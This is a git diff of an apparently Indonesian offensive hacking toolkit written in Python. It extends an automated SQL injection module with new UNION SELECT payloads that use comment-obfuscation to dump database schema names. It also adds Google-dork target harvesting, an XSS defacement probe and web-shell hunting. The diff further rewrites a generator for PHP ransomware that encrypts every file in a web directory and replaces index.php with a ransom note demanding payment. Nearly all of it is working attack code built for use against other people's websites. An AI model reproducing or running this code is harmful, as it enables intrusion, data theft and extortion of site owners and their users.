@@ -114,12 +114,10 @@ def sqlite():
     elif os.name == 'nt':
         os.system('cls')
     pass
-    path = os.path.expanduser("~")
-    user_name = os.path.split(path)[-1]
     logo = f"""{gold}
     +--------------------------------------+
     |                                      |
-    |           {green}WELCOME {red}{user_name}!{gold}         |
+    |           {green}WELCOME {red}To SQLITE!{gold}         |
     |                                      |
     +--------------------------------------+
                     {white}SQLite V1              
@@ -160,6 +158,22 @@ def sqlite():
                 print("Permission Error Detected, If u are using kali linux or else, please use root with typing 'sudo su' ! ")
             except:
                 pass
+    def save_log2(target, ul):
+        a = f"Site : {target}\n"
+        a += f"Type : Injected\n"
+        a += f"Payload : {ul}"
+        target_directory = 'sqlite'
+        file_name = 'Injected_Sites_Phase3.txt'
+
+        path = os.path.join(target_directory, file_name)
+        with open(path, 'a') as file:
+            try:
+                file.write(str(a))
+                file.close()
+            except PermissionError:
+                print("Permission Error Detected, If u are using kali linux or else, please use root with typing 'sudo su' ! ")
+            except:
+                pass
     print(logo)
     choi = input(yellow + f"Sqlite@Choices ~{white}$ ")
     def singleinject():
@@ -179,6 +193,12 @@ def sqlite():
         order_by = 'SELECT * FROM orders ORDER BY 1, 2, 3, 4, 5, 6, 7, 8, 9, 10;'
         target = str(input(f"{yellow}[{green}~{yellow}] {gold}Enter your target url [ Example : https://example.com/news.php?id=1 ] :{white} "))
         tampers = input(f"{yellow}[{green}~{yellow}] {gold}Use Tamper ? Y/N :{white} ")
+        if tampers.lower() == 'y':
+            pass
+        elif tampers.lower() == 'n':
+            pass
+        else:
+            print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Invalid Options! {white}")
         if (target.lower() == 'https://' or 'http://'):
             target = target
         else:
@@ -213,7 +233,7 @@ def sqlite():
                 print(f"{yellow}[{green}~{yellow}] {gold}Starting ORDER BY until 50.{yellow}", c, end='\r')
                 uri = target+onion
                 r = requests.get(uri, headers=heads)
-                if (r.text == 'known column' in r.text):
+                if (r.text == "in 'order clause'" in r.text):
                     print(f"{yellow}[{green} Injected! {yellow}] {gold} Site : {target} Injected!, Detected : Column {value}")
                     print(f"{yellow}[{green} Injected! {yellow}] {gold} Payload : {uri}")
                     start_savelog(target, uri, value)
@@ -238,7 +258,7 @@ def sqlite():
                 xss = "'--+<h1>Touched By JogjaXploit</h1>"
                 print(f"{yellow}[{green}~{yellow}] {gold}Testing XSS{white}")
                 url = target+xss
-                req = requests.get(url, header=heads)
+                req = requests.get(url, headers=heads)
                 if ('Touched By JogjaXploit' in req.text):
                     print(f"{yellow}[{green}~{yellow}] {gold}Target is VULN with XSS{white}")
                 else:
@@ -261,24 +281,52 @@ def sqlite():
                         e = requests.get(yuhuh)
                     else:
                         exit()
-                    if ("1" or "2" or "3" or "4" or "5" or "6" or "7" or "8" or "9" or "10" or "11" or "12" or "13" or "14" or "15" or "16" or "17" or "18" or "19" or "20" or "21" or "22" or "23" or "24" or "25" or "26" or "27" or "28" or "29" or "30" or "31" or "32" or "33" or "34" or "35" or "36" or "37" or "38" or "39" or "40" or "41" or "42" or "43" or "44" or "45" or "46" or "47" or "48" or "49" or "50" in e.text):
-                        print(f"{yellow}[{green}~{yellow}] {gold}Trying to dump database..{white}")
-                        dumps = bypass_dumps1.replace(f"{value}", dumpz)
-                        domp = target+dumps
-                        def inject():
-                            if tampers.lower() == 'y':
-                                e = requests.get(domp, headers=heads)
-                            elif tampers.lower() == 'n':
-                                e = requests.get(domp)
-                            if ecode1 in e.text:
-                                print(f"{yellow}[{red} CRITICAL {yellow}] {gold} 403 Forbidden")
-                                pass
-                            return e.text
-                        inject()
+                if (e.text == "1" or e.text == "2" or e.text == "3" or e.text == "4" or e.text == "5" or e.text == "6" or e.text == "7" or e.text == "8" or e.text == "9" or e.text == "10" or e.text == "11" or e.text == "12" or e.text == "13" or e.text == "14" or e.text == "15" or e.text == "16" or e.text == "17" or e.text == "18" or e.text == "19" or e.text == "20" or e.text == "21" or e.text == "22" or e.text == "23" or e.text == "24" or e.text == "25" or e.text == "26" or e.text == "27" or e.text == "28" or e.text == "29" or e.text == "30" or e.text == "31" or e.text == "32" or e.text == "33" or e.text == "34" or e.text == "35" or e.text == "36" or e.text == "37" or e.text == "38" or e.text == "39" or e.text == "40" or e.text == "41" or e.text == "42" or e.text == "43" or e.text == "44" or e.text == "45" or e.text == "46" or e.text == "47" or e.text == "48" or e.text == "49" or e.text == "50" in e.text):
+                    print(f"{yellow}[{green}~{yellow}] {gold}Trying to dump database..{white}")
+                    dumps = bypass_dumps1.replace(f"{value}", dumpz)
+                    domp = target+dumps
+                    def inject():
+                        if tampers.lower() == 'y':
+                            e = requests.get(domp, headers=heads)
+                        elif tampers.lower() == 'n':
+                            e = requests.get(domp)
+                        if ecode1 in e.text:
+                            print(f"{yellow}[{red} CRITICAL {yellow}] {gold} 403 Forbidden")
+                            pass
+                        if (e.text == 'information_schema' in e.text):
+                            print(f"{yellow}[ {red}!! {yellow}] {gold} Injected !")
+                        return e.text
+                    inject()
+                print("Finished")
+            def phase3():
+                value = 0
+                dumpz = '(select%20group_concat(0x3c6c693e,schema_name,0x3c6c693e)%20from%20information_schema.schemata)'
+                for i in range(50):
+                    value += 1
+                    print(f"{yellow}[{green}~{yellow}] {gold}Starting Re-Inject (Dump Payload) Until 50 [ Phase3 ]{yellow}", value, white, end='\r')
+                    t = f','.join(str(t) for t in range(1, value + 1))
+                    onion = (f"{t},")
+                    ott = onion
+                    a = f"'/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/{ott}{dumpz}"
+                    ul = target+a
+                    if tampers.lower() == 'y':
+                        reques = requests.get(ul, headers=heads)
+                    elif tampers.lower() == 'n':
+                        reques = requests.get(ul)
+                    else:
+                        print(f"{yellow}[{red}~{yellow}] {red} Invalid Options {white}")
+                        exit()
+                    if (reques.text == "information_schema" in reques.text):
+                        print(f"{yellow}[ {green}Injected {yellow}] {gold}Site : {url} is injected! {white}")
+                        print(f"{yellow}[ {green}Injected {yellow}] {gold}Payload : {ul} {white}")
+                        save_log2(target, ul)
+                    else:
+                        print(f"{yellow}[ {red}CRITICAL {yellow}] {gold} Site is not vulnerable with sqli..{white}")
                 print("Finished")
             byps = ["' OR 1=1; --", "' OR 'a'='a'; --", "' OR 1=1# --", "' OR 'a'='a'# --", "' OR 1=1/*", "' OR 'a'='a'/*", "'-1' OR '1'='1'", "'-1' OR 'a'='a'", "' OR 1=1/*", "' OR 'a'='a'/*"]
             start_orderby()
             phase2()
+            phase3()
             xss()
             for method in byps:
                 url = target+method
@@ -294,7 +342,7 @@ def sqlite():
                     print(yellow + f"[{green}~{yellow}] {gold}Target is {green}vuln!{yellow}")
                     print(yellow + f"Payload : {url}")
                 else:
-                    print(red + "Maybe target has no vuln.")
+                    print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Maybe target has no vuln.{white}")
         def testing():
             heads = {
                 f"User-Agent": f"{random.choice(user_agents)}",
@@ -429,7 +477,8 @@ def sqlite():
                         e = requests.get(yuhuh)
                     else:
                         exit()
-                    if ("1" or "2" or "3" or "4" or "5" or "6" or "7" or "8" or "9" or "10" or "11" or "12" or "13" or "14" or "15" or "16" or "17" or "18" or "19" or "20" or "21" or "22" or "23" or "24" or "25" or "26" or "27" or "28" or "29" or "30" or "31" or "32" or "33" or "34" or "35" or "36" or "37" or "38" or "39" or "40" or "41" or "42" or "43" or "44" or "45" or "46" or "47" or "48" or "49" or "50" in e.text):
+                    if ("1" or "2" or "3" or "4" or "5" or "6" or "7" or "8" or "9" or "10" or "11" or "12" or "13" or "14" or "15" or "16" or "17" or "18" or "19" or "20" or "21" or "22" or "23" or "24" or "25" or "26" or "27" or "28" or "29" or "30" or "31" or "32" or "33" or "34" or "35" or "36" or "37" or "38" or "39" or "40" or "41" or "42" or "43" or "44" or "45" or "46" or "47" or "48" or "49" or "50" or "information_schema" in e.text):
+                        pass
                         print(f"{yellow}[{green}~{yellow}] {gold}Trying to dump database..{white}")
                         dumps = bypass_dumps1.replace(f"{value}", dumpz)
                         domp = target+dumps
@@ -441,7 +490,7 @@ def sqlite():
                             if ecode1 in e.text:
                                 print(f"{yellow}[{red} CRITICAL {yellow}] {gold} 403 Forbidden")
                                 pass
-                            return e.text
+                            print(e.text)
                         inject()
                 print("Finished")
             byps = ["' OR 1=1; --", "' OR 'a'='a'; --", "' OR 1=1# --", "' OR 'a'='a'# --", "' OR 1=1/*", "' OR 'a'='a'/*", "'-1' OR '1'='1'", "'-1' OR 'a'='a'", "' OR 1=1/*", "' OR 'a'='a'/*"]
@@ -462,7 +511,7 @@ def sqlite():
                     print(yellow + f"[{green}~{yellow}] {gold}Target is {green}vuln!{yellow}")
                     print(yellow + f"Payload : {url}")
                 else:
-                    print(red + "Maybe target has no vuln.")
+                    print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Maybe target has no vuln.")
         def testing():
             heads = {
                 f"User-Agent": f"{random.choice(user_agents)}",
@@ -489,7 +538,7 @@ def sqlite():
                     if ("Warning: mysql_query" or "Warning: mysql_fetch_row" or "Warning: mysql_fetch_assoc" or "Warning: mysql_fetch_object" or "Warning: mysql_numrows" or "Warning: mysql_num_rows" or "Warning: mysql_fetch_array" or "Warning: pg_connect" or "Supplied argument is not a valid PostgreSQL result" or "PostgreSQL query failed: ERROR: parser: parse error" or "MySQL Error" or "MySQL ODBC" or "MySQL Driver" or "supplied argument is not a valid MySQL result resource" or "on MySQL result index" or "Oracle ODBC" or "Oracle Error" or "Oracle Driver" or "Oracle DB2" or "Microsoft JET Database Engine error" or "ADODB.Command" or "ADODB.Field error" or "Microsoft Access Driver" or "Microsoft VBScript runtime error" or "Microsoft VBScript compilation error" or "Microsoft OLE DB Provider for SQL Server error" or "OLE/DB provider returned message" or "OLE DB Provider for ODBC" or "ODBC SQL" or "ODBC DB2" or "ODBC Driver" or "ODBC Error" or "ODBC Microsoft Access" or "ODBC Oracle" or "JDBC SQL" or "JDBC Oracle" or "JDBC MySQL" or "JDBC error" or "JDBC Driver" or "Invision Power Board Database Error" or "DB2 ODBC" or "DB2 error" or "DB2 Driver" or "error in your SQL syntax" or "unexpected end of SQL command" or "invalid query" or "SQL command not properly ended" or "Error converting data type varchar to numeric" or "An illegal character has been found in the statement" or "Active Server Pages error" or "ASP.NET_SessionId" or "ASP.NET is configured to show verbose error messages" or "A syntax error has occurred" or "ORA-01756" or "Error Executing Database Query" or "Unclosed quotation mark" or "BOF or EOF" or "GetArray" or "FetchRow" or "Input string was not in a correct format" or "Warning: include" or "Warning: require_once" or "function.include" or "Disallowed Parent Path" or "function.require" or "Warning: main" or "Warning: session_start" or "Warning: getimagesize" or "Warning: mysql_result" or "Warning: pg_exec" or "Warning: array_merge" or "Warning: preg_match" or "Incorrect syntax near" or "ORA-00921: unexpected end of SQL command" or "Warning: ociexecute" or "Warning: ocifetchstatement" or "error ORA-" or "u have an error in your SQL syntax" in a):
                         print(f"{yellow}[{green}~{yellow}] {gold}Site : {target} is Vuln!{white}")
                     else:
-                        print(f"{yellow}[{green}~{yellow}] {gold}Site : {red}{target}{yellow} maybe not vuln {white}")
+                        print(f"{yellow}[{red} CRITICAL {yellow}] {gold}Site : {red}{target}{yellow} maybe not vuln {white}")
                         choicess = input("Do you want to continue ? Y/N : ")
                         if choicess.lower() == 'y':
                             start_injection_sql()
@@ -504,7 +553,13 @@ def sqlite():
         try:
             target = str(input(f"{yellow}[{green}~{yellow}] {gold}Enter your dork :{white} \n"))
             for i in search(target, num=int(1), pause=2, start=0, stop=0):
-                print(f"{yellow}[{green}~{yellow}] {gold}{i}")
+                try:
+                    print(f"{yellow}[{green}~{yellow}] {gold}{i}")
+                except urllib.error.HTTPError as e:
+                    if e.code == 429:
+                        continue
+                    else:
+                        continue
             print('Done.')
         except:
             print('Error')
@@ -515,8 +570,11 @@ def sqlite():
         for i in search(target, num=int(1), pause=2, start=0, stop=0):
             try:
                 print(f"{yellow}[{green}~{yellow}] {gold}{i}")
-            except:
-                continue
+            except urllib.error.HTTPError as e:
+                if e.code == 429:
+                    continue
+                else:
+                    continue
         sites = i.split()
         for site in sites:
             dorkninject(site)
@@ -532,9 +590,23 @@ def sqlite():
         print('Done')
     elif choi == '5':
         def web_crawler(url):
+            heads = {
+                f"User-Agent": f"{random.choice(user_agents)}",
+                f"Host": f"{url}",
+                f"Content-Length": "20",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "text/html",
+                "Referer": "https://gtamper.co.me",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Custom-Header": "GTamper",
+            }
             try:
                 # Send a GET request to the URL
-                response = requests.get(url)
+                response = requests.get(url, headers=heads)
 
                 # Check if the request was successful (status code 200)
                 if response.status_code == 200:
@@ -571,8 +643,22 @@ def sqlite():
             web_crawler(site)
     elif choi == '6':
         def search_shells(url):
+            heads = {
+                f"User-Agent": f"{random.choice(user_agents)}",
+                f"Host": f"{url}",
+                f"Content-Length": "20",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "text/html",
+                "Referer": "https://gtamper.co.me",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Custom-Header": "GTamper",
+            }
             try:
-                resp = requests.get(url)
+                resp = requests.get(url, headers=heads)
                 if resp.status_code == 200:
                     base_url = resp.url
                     soup = BeautifulSoup(resp.content, 'html.parser')
@@ -585,7 +671,7 @@ def sqlite():
                             se  = s.split(',')
                             sh = se
                         elif c.lower() == 'n':
-                            sh = ['indoxploit.php', 'mini.php', 'shellv3.php', 'shell', 'shell', 'adminweb.php', 'shellv2', 'shellv3']
+                            sh = ['indoxploit.php', 'mini.php', 'shellv3.php', 'shell', 'shell', 'adminweb.php', 'shellv2', 'shellv3', '.php']
                         for i in sh:
                             print(f"{yellow}[ {green}INFO{yellow} ]{gold} Searching For {i} .. {yellow}[ {green}~ {yellow}]{white}")
                             if absolute_url.endswith(i):
@@ -602,36 +688,95 @@ def sqlite():
     else:
         print(red + 'Invalid options!')
         return sqlite()
-def ransomware1(name, tdir, sa):
-    func = "{\n"
-    func += "    $key = 'FuckY0URM0MM4H4HaHaHA'; // Replace with your own secret key\n"
-    func += '    $encryptedContent = openssl_encrypt(file_get_contents($file), "AES-256-CBC", $key, 0, substr($key, 0, 16));\n'
-    func += "    file_put_contents($file, $encryptedContent);\n"
-    func += "}\n\n"
-    func += "function encryptDirectory($dir) {\n"
-    func += "    $dirContent = scandir($dir);\n\n"
-    func += "    foreach ($dirContent as $entry) {\n"
-    func += '        if ($entry !== "." && $entry !== "..") {\n'
-    func += '            $entryPath = $dir . "/" . $entry;\n\n'
-    func += "            if (is_dir($entryPath)) {\n"
-    func += "                encryptDirectory($entryPath);\n"
-    func += "            } else {\n"
-    func += "                encryptFile($entryPath);\n"
-    func += "            }\n"
-    func += "        }\n"
-    func += "    }\n"
-    func += "}"
-    ransomware1 = f"<?php\n"
-    ransomware1 += f"function encryptFile($file) {func}\n\n"
-    ransomware1 += f'$message = "Encrypted By {name} !";\n'
-    ransomware1 += f'$targetDir = "{tdir}";\n\n'
-    ransomware1 += f"encryptDirectory($targetDir);\n\n"
-    ransomware1 += f"// Create a ransom note file\n"
-    ransomware1 += f'$ransomNote = $targetDir . "/RansomNote.txt";\n'
-    ransomware1 += f"file_put_contents($ransomNote, $message);\n\n"
-    ransomware1 += f'echo "All files in the directory " . $targetDir . " have been encrypted By {name}";\n\n'
-    ransomware1 += f"?>"
-    
+def ransomware1(sa, email):
+    ransomware1 = "<?php\n"
+    ransomware1 += "$encryptionKey = 'yoursitehasbeenencrypted'; // Change this to your desired encryption key\n"
+    ransomware1 += "// Function to encrypt a file\n"
+    ransomware1 += "function encryptFile($fileName, $encryptionKey) {\n"
+    ransomware1 += "    $fileContent = file_get_contents($fileName);\n"
+    ransomware1 += "    $encryptedContent = openssl_encrypt($fileContent, 'AES-256-CBC', $encryptionKey, 0, 'FuckY0URS1T3');\n"
+    ransomware1 += "    file_put_contents($fileName, $encryptedContent);\n"
+    ransomware1 += "}\n\n"
+    ransomware1 += "// Encrypt all files in a directory\n"
+    ransomware1 += "function encryptDirectory($dir, $encryptionKey) {\n"
+    ransomware1 += "    $files = scandir($dir);\n"
+    ransomware1 += "    foreach($files as $file) {\n"
+    ransomware1 += "        $filePath = $dir . '/' . $file;\n"
+    ransomware1 += "        if(is_file($filePath)) {\n"
+    ransomware1 += "            encryptFile($filePath, $encryptionKey);\n"
+    ransomware1 += "        } elseif($file != '.' && $file != '..' && is_dir($filePath)) {\n"
+    ransomware1 += "            encryptDirectory($filePath, $encryptionKey);\n"
+    ransomware1 += "        }\n"
+    ransomware1 += "    }\n"
+    ransomware1 += "}\n\n"
+    ransomware1 += "// Function to create glitch effect on text\n"
+    ransomware1 += "function glitchText($text) {\n"
+    ransomware1 += "    $glitchedText = '';\n"
+    ransomware1 += "    for ($i = 0; $i < strlen($text); $i++) {\n"
+    ransomware1 += '''        $glitchedText .= '<span style="color: white; text-shadow: 0 0 2px #00FFFF, 0 0 5px #00FFFF, 0 0 10px #00FFFF, 0 0 20px #00FFFF, 0 0 30px #00FFFF, 0 0 40px #00FFFF, 0 0 55px #00FFFF, 0 0 75px #00FFFF;">' . $text[$i] . '</span>';\n'''
+    ransomware1 += "    }\n"
+    ransomware1 += "    return $glitchedText;\n"
+    ransomware1 += "}\n\n"
+    ransomware1 += "// Main ransomware function\n"
+    ransomware1 += "function ransomware($encryptionKey) {\n"
+    ransomware1 += "    // Encrypt files in current directory\n"
+    ransomware1 += "    encryptDirectory('.', $encryptionKey);\n"
+    ransomware1 += "}\n\n"
+    ransomware1 += "// Call the ransomware function\n"
+    ransomware1 += "ransomware($encryptionKey);\n"
+    ransomware1 += "$notes = '<style>\n"
+    ransomware1 += "    @keyframes colorChange {\n"
+    ransomware1 += "        0% {\n"
+    ransomware1 += "            background-color: blue;\n"
+    ransomware1 += "        }\n"
+    ransomware1 += "        100% {\n"
+    ransomware1 += "            background-color: purple;\n"
+    ransomware1 += "        }\n"
+    ransomware1 += "    }\n\n"
+    ransomware1 += "    @keyframes glitch {\n"
+    ransomware1 += "        2%, 64% {\n"
+    ransomware1 += "            transform: translate(2px, -2px);\n"
+    ransomware1 += "        }\n"
+    ransomware1 += "        4%, 60% {\n"
+    ransomware1 += "            transform: translate(-2px, 2px);\n"
+    ransomware1 += "        }\n"
+    ransomware1 += "        62% {\n"
+    ransomware1 += "            transform: translate(-1px, 1px);\n"
+    ransomware1 += "        }\n"
+    ransomware1 += "    }\n\n"
+    ransomware1 += "    body {\n"
+    ransomware1 += "        font-family: Arial, sans-serif;\n"
+    ransomware1 += "        font-size: 20px;\n"
+    ransomware1 += "        text-align: center;\n"
+    ransomware1 += "    }\n\n"
+    ransomware1 += "    h1 {\n"
+    ransomware1 += "        color: white;\n"
+    ransomware1 += "        font-size: 28px;\n"
+    ransomware1 += "        animation: glitch 0.3s infinite;\n"
+    ransomware1 += "    }\n\n"
+    ransomware1 += "    p {\n"
+    ransomware1 += "        color: white;\n"
+    ransomware1 += "        font-size: 18px;\n"
+    ransomware1 += "        animation: glitch 0.3s infinite;\n"
+    ransomware1 += "    }\n\n"
+    ransomware1 += "    .container {\n"
+    ransomware1 += "        display: flex;\n"
+    ransomware1 += "        flex-direction: column;\n"
+    ransomware1 += "        align-items: center;\n"
+    ransomware1 += "        justify-content: center;\n"
+    ransomware1 += "        height: 100vh;\n"
+    ransomware1 += "        overflow: hidden;\n"
+    ransomware1 += "        animation: colorChange 5s infinite;\n"
+    ransomware1 += "    }\n"
+    ransomware1 += "</style>\n\n"
+    ransomware1 += '<div class="container">\n'
+    ransomware1 += "    <h1>Oops, your files have been encrypted!</h1>\n"
+    ransomware1 += "    <p>To decrypt your files, you must pay a ransom.</p>\n"
+    ransomware1 += f"    <p>Contact us at {email} for payment details.</p>\n"
+    ransomware1 += "    <p>Failure to comply will result in permanent deletion of your files.</p>\n"
+    ransomware1 += "</div>';\n"
+    ransomware1 += "file_put_contents('index.php', $notes);\n"
+    ransomware1 += "?>"
     target_directory = 'Ransomware'
     file_name = sa+'.php'
 
@@ -5289,10 +5434,9 @@ elif answer == ("20"):
                 pass
             if choice == '1':
                 pass
-                name = input("Enter your cyber name : ")
-                tdir = input("Target Dir [Ex : /home/user/public_html/] : ")
+                email = input("your email : ")
                 sa = input("Save AS [ex : ransomware1, ransomware2] : ")
-                ransomware1(name, tdir, sa)
+                ransomware1(sa, email)
             if choice == '2':
                 pass
                 name = input("Enter your cyber name : ")
